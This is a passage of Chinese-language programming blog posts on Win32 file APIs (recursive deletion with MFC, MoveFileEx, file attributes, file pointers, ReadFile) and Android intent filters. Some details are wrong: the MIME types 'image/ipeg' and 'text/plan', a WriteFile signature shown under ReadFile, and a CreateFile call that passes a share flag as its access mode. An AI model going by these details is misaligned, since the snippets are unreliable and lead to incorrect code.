<td><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">DeleteFile</span><span class="params">(  LPCTSTR lpFileName   <span class="comment">// pointer to name of file to delete</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure></td>
<td></td>
</tr>
<tr>
<td>但是在这里我还是要说一些比较关键的一些内容，删除不存在的文件的时候是会失败的，如果删除的文件是一个只读的属性，那么将会返回：ERROR_ACCESS_DENIED这个样子的一个值，这里我们写一个递归的函数（使用MFC的框架）实现递归删除。</td>
<td></td>
</tr>
<tr>
<td><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> CStudy_HistoryDlg::OnBnClickedButton1()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line">	CString Context ;EContext.GetWindowTextA(Context);</span><br><span class="line">	RecursiveDelete(Context);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> CStudy_HistoryDlg::RecursiveDelete(CString szPath)</span><br><span class="line">&#123;</span><br><span class="line">	CFileFind ff;</span><br><span class="line">	CString strPath = szPath;</span><br><span class="line">	<span class="keyword">if</span> (<span class="string">"\\"</span> != strPath.Right(<span class="number">1</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		strPath += <span class="string">"\\"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	strPath += <span class="string">"*.*"</span>;<span class="comment">//这个过滤器类型的东西貌似都是支持正则的。</span></span><br><span class="line">	BOOL bRet;<span class="comment">//用来标记是不是已经删除完毕。</span></span><br><span class="line">	<span class="keyword">if</span> (ff.FindFile(strPath))<span class="comment">//这个应该就是文件夹的第一个指针开始。</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">do</span> </span><br><span class="line">		&#123;</span><br><span class="line">			bRet = ff.FindNextFile();<span class="comment">//将内部的那个指针往下移动一下</span></span><br><span class="line">			<span class="keyword">if</span> (ff.IsDots())<span class="comment">//为.或..这种的上级目录</span></span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			strPath = ff.GetFilePath();</span><br><span class="line">			<span class="keyword">if</span> (!ff.IsDirectory())<span class="comment">//看看是不是一个目录</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="comment">//是一个文件</span></span><br><span class="line">				<span class="comment">//删除文件</span></span><br><span class="line">				::SetFileAttributes(strPath,FILE_ATTRIBUTE_NORMAL);<span class="comment">//先设置一下这个文件的属性，不要只读！！！</span></span><br><span class="line">				::DeleteFile(strPath);</span><br><span class="line"></span><br><span class="line">			&#125;<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				RecursiveDelete(strPath);<span class="comment">//经典的递归调用</span></span><br><span class="line">				::SetFileAttributes(strPath,FILE_ATTRIBUTE_NORMAL);<span class="comment">//和上面一样</span></span><br><span class="line">				::RemoveDirectory(strPath); <span class="comment">//移除掉这个文件夹</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">while</span> (bRet);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></td>
<td></td>
</tr>
<tr>
<td>我都做了一定的注释，就是一个递归删除，使用了MFC的一个框架，说实话微软给的这个框架是真的好！</td>
<td></td>
</tr>
<tr>
<td>需要注意，我们使用<code>DeleteFile</code>这个函数的话呢，是不会进入回收站的！</td>
<td></td>
</tr>
</tbody></table>
<h2 id="移动文件MoveFileEx"><a href="#移动文件MoveFileEx" class="headerlink" title="移动文件MoveFileEx"></a>移动文件<code>MoveFileEx</code></h2><p>这次还是在用个Ex加强版本的吧，看一下Ex版本的MSDN定义：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">MoveFileEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCTSTR lpExistingFileName,  <span class="comment">// pointer to the name of the existing file</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCTSTR lpNewFileName,       <span class="comment">// pointer to the new name for the file</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwFlags                <span class="comment">// flag that specifies how to move file</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>第三个的参数有点古怪：<br>比较有意思的一个值：“MOVEFILE_DELAY_UNTIL_REBOOT”，这个值的意思就是说重启才会移动，具体怎么用我也没有去深入研究，没啥意思我感觉，而且与其他的不能同时使用。<br>MOVEFILE_COPY_ALLOWED：这个就是说可以移动到别的盘符，还有就是好像指定了这个就是类似于先Copy再删除这个样子的操作。<br>MOVEFILE_REPLACE_EXISTING：替换掉存在的。<br>MOVEFILE_WRITE_THROUGH：这个就是说等待函数结束才会返回。<br>说了这么多就实验一下吧。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	MoveFileEx(<span class="string">"1.txt"</span>,<span class="string">"2.txt"</span>,MOVEFILE_COPY_ALLOWED|MOVEFILE_REPLACE_EXISTING|MOVEFILE_WRITE_THROUGH);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>好吧也没啥可以验证的…</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/26/File-operate2/" data-id="ck5xij34x000fe0wjc836cq8r" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Win32%E7%BC%96%E7%A8%8B/" rel="tag">Win32编程</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-File-Attribute" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/01/24/File-Attribute/" class="article-date">
  <time datetime="2020-01-24T09:39:30.000Z" itemprop="datePublished">2020-01-24</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/01/24/File-Attribute/">File Attribute</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="文件属性的读取"><a href="#文件属性的读取" class="headerlink" title="文件属性的读取"></a>文件属性的读取</h1><p>文件属性的一些读取，主要就是依靠。</p>
<h2 id="GetFileType获取文件类型"><a href="#GetFileType获取文件类型" class="headerlink" title="GetFileType获取文件类型"></a><code>GetFileType</code>获取文件类型</h2><p>就一个参数，文件句柄，<code>CreateFile</code>获得的，返回值：</p>
<table>
<thead>
<tr>
<th>Value</th>
<th>Meaning</th>
</tr>
</thead>
<tbody><tr>
<td>FILE_TYPE_UNKNOWN</td>
<td>The type of the specified file is unknown.</td>
</tr>
<tr>
<td>FILE_TYPE_DISK</td>
<td>The specified file is a disk file.</td>
</tr>
<tr>
<td>FILE_TYPE_CHAR</td>
<td>The specified file is a character file, typically an LPT device or a console.</td>
</tr>
<tr>
<td>FILE_TYPE_PIPE</td>
<td>The specified file is either a named or anonymous pipe.</td>
</tr>
</tbody></table>
<h2 id="GetFileSize获取文件尺寸"><a href="#GetFileSize获取文件尺寸" class="headerlink" title="GetFileSize获取文件尺寸"></a><code>GetFileSize</code>获取文件尺寸</h2><p>这个函数用来获取文件的大小，在读取文件的时候很好用</p>
<p><strong>如果函数成功，则返回的值是文件大小的低阶双字，如果lpFileSizeHigh是非null，则函数将文件大小的高阶双字放入该参数指向的变量中。<br>如果函数失败且lpFileSizeHigh为NULL，则返回值为0xFFFFFFFF。要获取扩展的错误信息，请调用GetLastError。<br>如果函数失败并且lpFileSizeHigh是非空的，则返回值为0xFFFFFFFF, GetLastError将返回一个NO_ERROR以外的值。</strong><br>返回值的一个判定，简单看看就好了。</p>
<h2 id="GetFileAttributes获取文件属性"><a href="#GetFileAttributes获取文件属性" class="headerlink" title="GetFileAttributes获取文件属性"></a><code>GetFileAttributes</code>获取文件属性</h2><p>这个东西不复杂就是有点乱，参数就是一个字符串，不要忘记转义就好了。<br>看一下MSDN的一些说明。</p>
<table>
<thead>
<tr>
<th>Attribute</th>
<th>Meaning</th>
</tr>
</thead>
<tbody><tr>
<td>FILE_ATTRIBUTE_ARCHIVE</td>
<td>The file or directory is an archive file or directory. Applications use this attribute to mark files for backup or removal.</td>
</tr>
<tr>
<td>FILE_ATTRIBUTE_COMPRESSED</td>
<td>The file or directory is compressed. For a file, this means that all of the data in the file is compressed. For a directory, this means that compression is the default for newly created files and subdirectories.</td>
</tr>
<tr>
<td>FILE_ATTRIBUTE_DIRECTORY</td>
<td>The handle identifies a directory.</td>
</tr>
<tr>
<td>FILE_ATTRIBUTE_ENCRYPTED</td>
<td>The file or directory is encrypted. For a file, this means that all data streams are encrypted. For a directory, this means that encryption is the default for newly created files and subdirectories.</td>
</tr>
<tr>
<td>FILE_ATTRIBUTE_HIDDEN</td>
<td>The file or directory is hidden. It is not included in an ordinary directory listing.</td>
</tr>
<tr>
<td>FILE_ATTRIBUTE_NORMAL</td>
<td>The file or directory has no other attributes set. This attribute is valid only if used alone.</td>
</tr>
<tr>
<td>FILE_ATTRIBUTE_OFFLINE</td>
<td>The data of the file is not immediately available. Indicates that the file data has been physically moved to offline storage.</td>
</tr>
<tr>
<td>FILE_ATTRIBUTE_READONLY</td>
<td>The file or directory is read-only. Applications can read the file but cannot write to it or delete it. In the case of a directory, applications cannot delete it.</td>
</tr>
<tr>
<td>FILE_ATTRIBUTE_REPARSE_POINT</td>
<td>The file has an associated reparse point.</td>
</tr>
<tr>
<td>FILE_ATTRIBUTE_SPARSE_FILE</td>
<td>The file is a sparse file.</td>
</tr>
<tr>
<td>FILE_ATTRIBUTE_SYSTEM</td>
<td>The file or directory is part of, or is used exclusively by, the operating system.</td>
</tr>
<tr>
<td>FILE_ATTRIBUTE_TEMPORARY</td>
<td>The file is being used for temporary storage. File systems attempt to keep all of the data in memory for quicker access rather than flushing the data back to mass storage. A temporary file should be deleted by the application as soon as it is no longer needed.</td>
</tr>
<tr>
<td>（呼~，终于写完了，手都累酸了）</td>
<td></td>
</tr>
</tbody></table>
<p>返回值就是这样子判断，这些东西对与目录一样也是适用的。<br>示例代码：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD dwAttributes = GetFileAttributes(<span class="string">"Wker.txt"</span>) ; </span><br><span class="line">	<span class="keyword">if</span>(dwAttributes == <span class="number">0XFFFFFFFF</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"这是个什么东西？"</span>; </span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>((dwAttributes &amp; FILE_ATTRIBUTE_DIRECTORY) == FILE_ATTRIBUTE_DIRECTORY)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"啊！是个目录啊"</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"啊!是个文件啊"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>设置文件属性：<code>SetFileAttributes</code></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">SetFileAttributes</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCTSTR lpFileName,  <span class="comment">// pointer to filename</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwFileAttributes   <span class="comment">// attributes to set</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>参数就不介绍了，很简单，第二个参数值太多，百度一下就可以了。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/24/File-Attribute/" data-id="ck5xij34q0009e0wj4zkb7mmi" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Win32%E7%BC%96%E7%A8%8B/" rel="tag">Win32编程</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Intent-过滤器" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/01/24/Intent-%E8%BF%87%E6%BB%A4%E5%99%A8/" class="article-date">
  <time datetime="2020-01-24T08:24:35.000Z" itemprop="datePublished">2020-01-24</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/01/24/Intent-%E8%BF%87%E6%BB%A4%E5%99%A8/">Intent-过滤器</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Intent过滤器"><a href="#Intent过滤器" class="headerlink" title="Intent过滤器"></a>Intent过滤器</h1><p>这个东西就是一个过滤器，用于过滤intent发送给Activity信息的时候对发送对象的一个过滤，那么我们具体怎么使用呢？<br>首先我们需要用隐式Intent进行消息的发送，首先我们对我们的Activity进行过滤器的设置例如如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">intent-filter</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"com.wker.top"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.DEFAULT"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:scheme</span>=<span class="string">"http"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>例如这个样子，我们需要设置intent的时候是这个样子的：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">intent.setAction(<span class="string">"com.wker.top"</span>);</span><br><span class="line">intent.addCategory(Intent.CATEGORY_DEFAULT);</span><br><span class="line">intent.setData(Uri.parse(<span class="string">"http:"</span>));</span><br><span class="line">startActivity(intent);</span><br></pre></td></tr></table></figure>
<p>这个时候我们需要注意，我们设置的协议scheme的时候是http，但是我们要用Data数据的时候我们需要填写完整的‘http:’，这个使我们需要注意的，这个时候我们就能成功的打开我们的页面了，那么我们看到Data还有好多的属性，我们继续设置。主要看我们的Data数据设置和我们的URI的一个设置。<br><code>&lt;data android:scheme=&quot;http&quot; android:host=&quot;wker666.github.io&quot; android:port=&quot;80&quot; android:path=&quot;/Android&quot;/&gt;</code><br><code>intent.setData(Uri.parse(&quot;http://wker666.github.io:80/Android&quot;));</code><br>其实可以看到也就是按照一个URL类似的格式进行填写的。<br><strong>Intent过滤器中的category属性称之为类别判定，其实也很好理解，就是对于APP类型的一个判定（我猜的，因为我看到值有default和browser这类的值，所以我感觉应该就是），而且这里还需要注意，可以设置多个category是不会影响的，就是说一个正确了其他的不正确也不影响。</strong></p>
<p>而且category这个节点的属性是必须存在的！！！</p>
<p>下面说说Data这个节点的属性，有点繁杂，但是也是比较好用的，重点的上面提到了，主要说说那个mimeType：</p>
<table>
<thead>
<tr>
<th>文件拓展名</th>
<th>MIMEType</th>
</tr>
</thead>
<tbody><tr>
<td>png</td>
<td>image/png</td>
</tr>
<tr>
<td>bmp\dib</td>
<td>image/bmp</td>
</tr>
<tr>
<td>jpg\jpeg\jpg</td>
<td>image/ipeg</td>
</tr>
<tr>
<td>gif</td>
<td>image/gif</td>
</tr>
<tr>
<td>mp3</td>
<td>audio/mpeg</td>
</tr>
<tr>
<td>mp4\mpg4\m4v\mp4v</td>
<td>video/mp4</td>
</tr>
<tr>
<td>js</td>
<td>application/javascript</td>
</tr>
<tr>
<td>pdf</td>
<td>application/pdf</td>
</tr>
<tr>
<td>text\txt</td>
<td>text/plan</td>
</tr>
<tr>
<td>json</td>
<td>application/json</td>
</tr>
<tr>
<td>xml</td>
<td>text/xml</td>
</tr>
</tbody></table>
<p>这个就是从网上摘录的一部分，在网站上经常见到，就是来设定格式的，在渗透测试中需要注意就是只是单纯的过滤这个格式的话呢是存在漏洞的，之后再提这个，但是在Win32中这个东西简直是个噩梦，之后有机会再说。<br>这个东西有点两样，谷歌把他单纯的分离出来了，而且它的函数比较特殊，我们来看一下。<br><code>SetDate</code>：<em>This method automaticallyclears any type that was previously set by setType or setTypeAndNormalize. *<br>很怪，这东西的意思是说会清除我们之前设置的<code>setType</code>，然而我们我们的<code>setType</code>这个也是：</em>This method automatically clears any data that waspreviously set (for example by setData). *<br>就是一个矛盾的函数，那么我们怎么办？谷歌给我们了一个方法专门用来解决这个问题：<br><code>intent.setDataAndType(data, type)</code><br>这个方法就是可以解决的，我们的XML设置：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.DEFAULT"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:scheme</span>=<span class="string">"http"</span> <span class="attr">android:host</span>=<span class="string">"wker666.github.io"</span> <span class="attr">android:port</span>=<span class="string">"80"</span> <span class="attr">android:path</span>=<span class="string">"/Android"</span> <span class="attr">android:mimeType</span>=<span class="string">"text/plan"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>Intent设置：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intent.setDataAndType(Uri.parse(<span class="string">"http://wker666.github.io:80/Android"</span>), <span class="string">"text/plan"</span>);</span><br></pre></td></tr></table></figure>
<p>这个样子就是正常了的！</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/24/Intent-%E8%BF%87%E6%BB%A4%E5%99%A8/" data-id="ck5xij359000ue0wj3548h21s" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Android%E5%AD%A6%E4%B9%A0/" rel="tag">Android学习</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-File-operate" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/01/24/File-operate/" class="article-date">
  <time datetime="2020-01-24T01:35:09.000Z" itemprop="datePublished">2020-01-24</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/01/24/File-operate/">File operate</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h1><p>上篇博客说道了强大的CreateFile函数，现在就介绍如何进行文件的具体操作。</p>
<h2 id="SetFilePointer移动文件指针"><a href="#SetFilePointer移动文件指针" class="headerlink" title="SetFilePointer移动文件指针"></a><code>SetFilePointer</code>移动文件指针</h2><p>读文件的时候我们要标志我们具体读到了哪个地方，那么我们就需要一个指针，这个指针代表我们具体读到了什么地方。<br><code>SetFilePointer</code>这个函数就是设置这个指针的位置，方便我们可以随机读取文件。<br>看下MSDN的一个介绍：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">SetFilePointer</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hFile,          <span class="comment">// handle of file</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LONG lDistanceToMove,  <span class="comment">// number of bytes to move file pointer</span></span></span></span><br><span class="line"><span class="function"><span class="params">  PLONG lpDistanceToMoveHigh,</span></span></span><br><span class="line"><span class="function"><span class="params">                         <span class="comment">// pointer to high-order DWORD of </span></span></span></span><br><span class="line"><span class="function"><span class="params">                         <span class="comment">// distance to move</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwMoveMethod     <span class="comment">// how to move</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<ol>
<li><code>hFile</code>这个就是我们打开文件的一个文件句柄，通过CreateFile就可获得。</li>
<li><code>lDistanceToMove</code>移动的一个距离</li>
<li><code>lpDistanceToMoveHigh</code>看名字就知道了这个是移动距离的高32位，一般至于超大文件才会用的到。</li>
<li><code>dwMoveMethod</code>指针的一个移动方式，主要是下面这三个值：<ul>
<li>FILE_BEGIN：从文件的开头进行移动</li>
<li>FILE_CURRENT：从当前的一个位置进行移动</li>
<li>FILE_END：从文件的结尾进行移动<br>简单易懂一下就看明白了。</li>
</ul>
</li>
</ol>
<p>返回值就是当前文件指针的位置，如果失败就是-1。<br>这个函数有个强大的功能，就是说比如你当前的这个文件有100KB，但是我却移动到了1000KB，那么再写入的时候我的文件就会增大。</p>
<h2 id="SetEndOfFile截断文件"><a href="#SetEndOfFile截断文件" class="headerlink" title="SetEndOfFile截断文件"></a><code>SetEndOfFile</code>截断文件</h2><p><code>SetEndOfFile</code>这个函数MSDN的一个定义：*The SetEndOfFile function moves the end-of-file (EOF) position for the specified file to the current position of the file pointer. *<br>简单的翻译一下：SetEndOfFile函数将指定文件的end-of (EOF)位置移动到文件指针的当前位置。<br>其实简单的说作用就是用来截断文件的。可以用来扩展，也可以用来截断一部分。</p>
<h2 id="ReadFile与WriteFile"><a href="#ReadFile与WriteFile" class="headerlink" title="ReadFile与WriteFile"></a><code>ReadFile</code>与<code>WriteFile</code></h2><p>看名字就知道这是读写文件的操作<br>首先我们看一下ReadFile的一个文件定义：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">WriteFile</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hFile,                    <span class="comment">// handle to file to write to</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCVOID lpBuffer,                <span class="comment">// pointer to data to write to file</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD nNumberOfBytesToWrite,     <span class="comment">// number of bytes to write</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpNumberOfBytesWritten,  <span class="comment">// pointer to number of bytes written</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPOVERLAPPED lpOverlapped        <span class="comment">// pointer to structure for overlapped I/O</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>下面说几个重点的参数就好了</p>
<ul>
<li><code>lpBuffer</code>这个参数就是接受的一个缓冲区</li>
<li><code>nNumberOfBytesToWrite</code>这个是用来读取的一个长度</li>
<li><code>lpNumberOfBytesWritten</code>实际读取的一个大小，用来判断是否结束了一般</li>
<li><code>lpOverlapped</code>重叠I/O的，NULL就好了，基本用不大到<br>说了这么多我们操作一下试试，首先还是要用到我们之前的<code>CreateFile</code>来打开我们的文件，获得文件的一个指针：</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hFile;</span><br><span class="line">	hFile = CreateFile(<span class="string">"Wker.txt"</span>,</span><br><span class="line">					FILE_SHARE_READ,<span class="comment">//要读这个文件	</span></span><br><span class="line">					<span class="number">0</span>,<span class="comment">//不共享</span></span><br><span class="line">					<span class="literal">NULL</span>,<span class="comment">//默认的安全属性</span></span><br><span class="line">					OPEN_EXISTING,<span class="comment">//打开文件</span></span><br><span class="line">					FILE_ATTRIBUTE_NORMAL,<span class="comment">//普通文件 </span></span><br><span class="line">					<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span>(hFile == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"打开失败，看看是不是有杀毒软件哦！"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	DWORD realRead;</span><br><span class="line">	SetFilePointer(hFile,<span class="number">0</span>, <span class="literal">NULL</span>, FILE_BEGIN); </span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">char</span>* t = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">20</span>];</span><br><span class="line">		<span class="keyword">if</span>( !ReadFile(hFile,t,<span class="number">20</span>,&amp;realRead,<span class="literal">NULL</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"fail"</span>;</span><br><span class="line">			<span 